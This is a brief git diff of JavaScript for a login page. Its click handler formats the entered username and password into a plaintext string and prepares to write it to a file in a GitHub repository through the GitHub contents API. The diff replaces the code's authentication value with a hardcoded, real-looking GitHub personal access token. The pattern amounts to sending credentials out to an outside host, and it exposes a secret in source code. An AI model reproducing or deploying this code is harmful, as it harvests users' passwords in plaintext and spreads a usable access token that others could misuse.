@@ -10,7 +10,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const repoOwner = 'Arnav-lunatic'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '8PzvTwBYYEfQNcDcv5exuLbvBITAfz2TBOrG'
+      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
